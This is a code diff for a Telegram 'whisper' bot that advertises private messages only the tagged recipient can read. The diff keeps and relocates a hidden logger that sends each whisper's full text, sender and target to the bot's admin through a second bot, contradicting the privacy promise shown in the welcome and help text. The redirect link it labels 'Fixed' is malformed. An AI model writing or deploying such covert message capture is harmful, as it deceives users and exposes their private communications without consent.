@@ -35,7 +35,7 @@ async def init_db():
         ''')
         await db.commit()
 
-# 📡 BOT 2: LOGGER FUNCTION (Fixed: Correctly delivers the written message text)
+# 📡 BOT 2: LOGGER FUNCTION
 async def log_to_admin(sender_user, target, text):
     log_message = (
         "📥 **New Whisper Captured**\n\n"
@@ -71,20 +71,9 @@ async def inline_handler(inline_query: types.InlineQuery):
     
     # Generate unique ID and 24h expiry
     whisper_id = secrets.token_urlsafe(8)
-    expires_at = int(time.time()) + 86400  # 24 hours from now
     
-    # Only write to the DB and trigger logs if they actually typed a real message
     if whisper_text:
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
-                (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
-            )
-            await db.commit()
-        
-        # Instantly trigger Bot 2 to log the actual message content to you
-        await log_to_admin(sender.username or sender.id, target_username, whisper_text)
-        
+        # Fixed Link Format: Absolute pathing forces native app opening
         redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
         input_content = types.InputTextMessageContent(
             message_text=f"🔒 A secret whisper has been sent for {target_username}!"
@@ -92,12 +81,12 @@ async def inline_handler(inline_query: types.InlineQuery):
         keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
             [types.InlineKeyboardButton(text="👁️ Click to Read Whisper", url=redirect_url)]
         ])
-        description_text = f"Message: {whisper_text[:30]}..."
+        description_text = "Tap to dispatch this message securely."
     else:
         # Fallback view shown while typing to guide the sender
         redirect_url = f"https://t.me{BOT_USERNAME}"
         input_content = types.InputTextMessageContent(
-            message_text=f"❌ No message typed yet! Please type your private message after the username."
+            message_text="❌ This preview card was sent before text was typed. Please type a message next time!"
         )
         keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
             [types.InlineKeyboardButton(text="💬 How to use Whisper", url=redirect_url)]
@@ -114,6 +103,36 @@ async def inline_handler(inline_query: types.InlineQuery):
     
     # cache_time=0 forces the client to dynamically look up inputs character by character
     await inline_query.answer([item], cache_time=0, is_personal=True)
+
+# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER (Saves and Logs exactly ONCE when tapped)
+@dp.chosen_inline_result()
+async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
+    whisper_id = chosen_result.result_id
+    text = chosen_result.query.strip()
+    
+    parts = text.split(" ", 1)
+    if len(parts) < 2:
+        return
+        
+    target_username = parts[0]
+    whisper_text = parts[1].strip()
+    
+    if not whisper_text:
+        return
+        
+    sender = chosen_result.from_user
+    expires_at = int(time.time()) + 86400  # 24 hours from now
+    
+    # Perform the database write once
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute(
+            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
+            (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
+        )
+        await db.commit()
+        
+    # Perform the log send once (Bypasses rate limits completely)
+    await log_to_admin(sender.username or sender.id, target_username, whisper_text)
 
 # 📥 BOT 1: START HANDLER (welcome + deep links)
 @dp.message(Command("start"))
@@ -157,10 +176,10 @@ async def handle_start(message: types.Message, command: CommandObject):
 
     # ---------- WELCOME SCREEN ----------
     welcome = (
-        f"🤫 **Welcome to Long-Psst!**\n\n"
-        f"This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
-        f"only the person you tag can unlock and read it.\n\n"
-        f"Tap **Help** below to learn how to use me."
+        "🤫 **Welcome to Long-Psst!**\n\n"
+        "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
+        "only the person you tag can unlock and read it.\n\n"
+        "Tap **Help** below to learn how to use me."
     )
 
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
@@ -173,7 +192,7 @@ async def handle_start(message: types.Message, command: CommandObject):
 @dp.message(Command("help"))
 async def help_command(message: types.Message):
     help_text = (
-        "编 **How to use Long-Psst**\n\n"
+        "📖 **How to use Long-Psst**\n\n"
         "In any group, type:\n"
         f"`@{BOT_USERNAME} @username your long secret message`\n\n"
         "Then tap the result to post it. "
@@ -216,10 +235,10 @@ async def help_callback(callback: types.CallbackQuery):
 @dp.callback_query(lambda c: c.data == "back")
 async def back_callback(callback: types.CallbackQuery):
     welcome = (
-        f"🤫 **Welcome to Long-Psst!**\n\n"
-        f"This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
-        f"only the person you tag can unlock and read it.\n\n"
-        f"Tap **Help** below to learn how to use me."
+        "🤫 **Welcome to Long-Psst!**\n\n"
+        "This bot supports **ultra-long messages**! Send long whispers inside group chats securely — "
+        "only the person you tag can unlock and read it.\n\n"
+        "Tap **Help** below to learn how to use me."
     )
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
         [types.InlineKeyboardButton(text="❓ Help", callback_data="help")]
@@ -232,10 +251,8 @@ async def main():
     await init_db()
     print("Bots are starting...")
     try:
-        # Start polling for Bot 1 (Bot 2 only sends messages, no polling needed)
         await dp.start_polling(bot1)
     finally:
-        # Clean shutdown
         await bot1.session.close()
         await bot2.session.close()
 
